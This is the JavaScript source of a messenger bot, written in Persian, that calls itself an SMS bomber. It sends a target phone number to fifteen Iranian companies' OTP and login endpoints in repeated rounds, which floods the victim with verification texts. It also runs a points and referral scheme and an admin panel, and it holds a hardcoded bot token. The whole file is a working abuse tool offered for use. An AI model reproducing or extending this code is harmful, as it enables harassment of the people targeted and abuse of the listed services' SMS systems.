const TOKEN = "CCECGG0UASZOEVMLGCLROSINXMADFBIONGNBDRUFOOKTKHOPYBAIQNSXGBJFRODI";
const ADMIN_ID = "shayan9229292";
const API_BASE = `https://botapi.rubika.ir/v3/${TOKEN}`;

const SERVICES = {
    divar: (p) => fetch('https://api.divar.ir/v5/auth/authenticate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
    sheypoor: (p) => fetch('https://www.sheypoor.com/api/v1/auth/otp/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
    digikala: (p) => fetch('https://api.digikala.com/v1/user/otp/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: p.replace('+98', '0')}) }),
    snapp: (p) => fetch('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cellphone: p}) }),
    tapsi: (p) => fetch('https://api.tapsi.ir/api/v2.2/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({credential: {phoneNumber: p.replace('+98', '0'), role: 'PASSENGER'}, otpOption: 'SMS'}) }),
    alibaba: (p) => fetch('https://ws.alibaba.ir/api/v3/account/mobile/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phoneNumber: p.replace('+98', '0')}) }),
    torob: (p) => fetch(`https://api.torob.com/a/phone/send-pin/?phone_number=${p.replace('+98', '0')}`, { method: 'GET' }),
    basalam: (p) => fetch('https://api.basalam.com/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({query: "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }", variables: {mobile: p.replace('+98', '0')}}) }),
    nobatir: (p) => fetch('https://nobat.ir/api/public/patient/login/phone', { method: 'POST', headers: {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'}, body: `------WebKitFormBoundary\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n${p.replace('+98', '0')}\r\n------WebKitFormBoundary--\r\n` }),
    digikala_jet: (p) => fetch('https://api.digikalajet.ir/user/login-register/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
    mobit: (p) => fetch('https://api.mobit.ir/api/web/v8/register/register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: p.replace('+98', '0')}) }),
    ghabzino: (p) => fetch('https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({Parameters: {MobileNumber: p.replace('+98', '0')}}) }),
    namava: (p) => fetch('https://www.namava.ir/api/v1.0/accounts/registrations/by-mobile/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({UserName: p.replace('+98', '0')}) }),
    idpay: (p) => fetch('https://idpay.ir/api/v1/auth/send-otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
    gap: (p) => fetch(`https://core.gap.im/v1/user/add.json?phone=${p.split('+')[1]}`, { method: 'GET' })
};

const userStates = new Map();
const userPoints = new Map();

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") {
      return new Response("🤖 Rubika Bomber Bot is ONLINE ✅", { status: 200 });
    }

    try {
      const update = await request.json();
      let message, callbackQuery;
      
      if (update.message) message = update.message;
      else if (update.callback_query) {
        callbackQuery = update.callback_query;
        message = callbackQuery.message;
      }

      if (!message) return new Response("OK");

      const chatId = message.chat.id.toString();
      const text = message.text || "";
      const username = message.from.username || "بدون یوزرنیم";
      const callbackData = callbackQuery ? callbackQuery.data : null;

      if (callbackData && callbackQuery) {
        await apiRequest("answerCallbackQuery", { callback_query_id: callbackQuery.id });
      }

      const userState = userStates.get(chatId) || {};
      const points = userPoints.get(chatId) || 0;

      if (text === "/start" || callbackData === "cancel") {
        userStates.delete(chatId);
        await sendMessage(chatId, "💣 به ربات اسپمر پیامک پیشرفته خوش آمدید!", getMainMenuKeypad());
        return new Response("OK");
      }

      if (text === ADMIN_ID) {
        userStates.set(chatId, { state: "admin_panel" });
        await sendMessage(chatId, "👑 به پنل مدیریت خوش آمدید:", getAdminPanelKeypad());
        return new Response("OK");
      }

      if (callbackData === "start_bomb") {
        if (points <= 0) {
          await sendMessage(chatId, "⚠️ امتیاز کافی ندارید!", getMainMenuKeypad());
          return new Response("OK");
        }
        userStates.set(chatId, { state: "awaiting_phone", username, points });
        await sendMessage(chatId, "📞 شماره تلفن هدف را وارد کنید:", getBackKeypad());
        return new Response("OK");
      }

      if (callbackData === "my_stats") {
        await sendMessage(chatId, `📊 آمار شما\n\n👤 یوزرنیم: ${username}\n⭐ امتیاز: ${points}`, getMainMenuKeypad());
        return new Response("OK");
      }

      if (callbackData === "daily_reward") {
        userPoints.set(chatId, points + 3);
        await sendMessage(chatId, "✅ 3 امتیاز دریافت کردید!", getMainMenuKeypad());
        return new Response("OK");
      }

      if (userState.state === "awaiting_phone" && text.match(/^(?:\+98|98|0)?9\d{9}$/)) {
        const phone = normalizePhone(text);
        userStates.set(chatId, { ...userState, state: "awaiting_rounds", phone });
        await sendMessage(chatId, `✔️ شماره ${phone} تایید شد.`, getRoundsKeypad());
        return new Response("OK");
      }

      if (userState.state === "awaiting_rounds" && callbackData && callbackData.startsWith("rounds_")) {
        const rounds = parseInt(callbackData.split('_')[1]);
        const phone = userState.phone;
        
        if (userState.points > 0) {
          userPoints.set(chatId, userState.points - 1);
        }
        
        await sendMessage(chatId, "⚡️ در حال آماده‌سازی حمله...", getCancelKeypad());
        ctx.waitUntil(startBombing(chatId, phone, rounds));
        userStates.delete(chatId);
        return new Response("OK");
      }

      if (callbackData === "admin_stats") {
        await sendMessage(chatId, `📊 آمار کلی\n\n👥 کاربران فعال: ${userStates.size}\n⚔️ سرویس‌ها: ${Object.keys(SERVICES).length}`, getAdminPanelKeypad());
        return new Response("OK");
      }

      return new Response("OK");
    } catch (error) {
      console.error(error);
      return new Response("ERROR", { status: 500 });
    }
  }
};

async function apiRequest(method, params = {}) {
  const response = await fetch(`${API_BASE}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(params)
  });
  return await response.json();
}

async function sendMessage(chatId, text, replyMarkup = null) {
  const params = { chat_id: chatId, text, parse_mode: "Markdown" };
  if (replyMarkup) params.reply_markup = replyMarkup;
  await apiRequest("sendMessage", params);
}

async function startBombing(chatId, phone, rounds) {
  const serviceKeys = Object.keys(SERVICES);
  let successCount = 0, failCount = 0;
  
  for (let round = 1; round <= rounds; round++) {
    for (let i = 0; i < serviceKeys.length; i++) {
      const serviceName = serviceKeys[i];
      try {
        const response = await SERVICES[serviceName](phone);
        if (response.ok) successCount++;
        else failCount++;
      } catch (e) {
        failCount++;
      }
      await new Promise(r => setTimeout(r, 100));
    }
    
    await sendMessage(chatId, 
      `🎯 عملیات...\n\n📱 هدف: \`${phone}\`\n🔄 دور: ${round}/${rounds}\n✅ موفق: ${successCount}\n❌ ناموفق: ${failCount}`
    );
  }
  
  await sendMessage(chatId, 
    `✅ عملیات تمام شد!\n\n📱 هدف: \`${phone}\`\n✅ موفق: ${successCount}\n❌ ناموفق: ${failCount}`,
    getMainMenuKeypad()
  );
}

function normalizePhone(phone) {
  let cleaned = phone.replace(/[^\d+]/g, '');
  if (cleaned.startsWith("09")) return "+98" + cleaned.substring(1);
  if (cleaned.startsWith("9")) return "+98" + cleaned;
  if (cleaned.startsWith("+98")) return cleaned;
  return phone;
}

function getMainMenuKeypad() {
  return {
    inline_keyboard: [
      [{ text: "💣 شروع عملیات", callback_data: "start_bomb" }],
      [{ text: "🎁 بمبر رایگان", callback_data: "free_bomb" }],
      [{ text: "📊 آمار من", callback_data: "my_stats" }, { text: "⭐ امتیازات", callback_data: "my_points" }],
      [{ text: "🎁 پاداش روزانه", callback_data: "daily_reward" }],
      [{ text: "🔗 ارجاع", callback_data: "referral" }, { text: "🔑 کد دعوت", callback_data: "enter_referral" }],
      [{ text: "💰 خرید امتیاز", callback_data: "buy_points" }],
      [{ text: "🛡 لیست سیاه", callback_data: "blacklist_self" }],
      [{ text: "📢 کانال", callback_data: "channel" }, { text: "❓ راهنما", callback_data: "help" }]
    ]
  };
}

function getBackKeypad() {
  return { inline_keyboard: [[{ text: "↪️ بازگشت", callback_data: "cancel" }]] };
}

function getRoundsKeypad() {
  return {
    inline_keyboard: [
      [{ text: "۱ دور", callback_data: "rounds_1" }, { text: "۲ دور", callback_data: "rounds_2" }, { text: "۳ دور", callback_data: "rounds_3" }],
      [{ text: "↪️ بازگشت", callback_data: "cancel" }]
    ]
  };
}

function getCancelKeypad() {
  return { inline_keyboard: [[{ text: "🚫 لغو", callback_data: "cancel_op" }]] };
}

function getAdminPanelKeypad() {
  return {
    inline_keyboard: [
      [{ text: "📊 آمار کلی", callback_data: "admin_stats" }],
      [{ text: "👥 کاربران", callback_data: "admin_users" }],
      [{ text: "⭐ افزودن امتیاز", callback_data: "admin_add_points" }],
      [{ text: "↪️ خروج", callback_data: "cancel" }]
    ]
  };
}
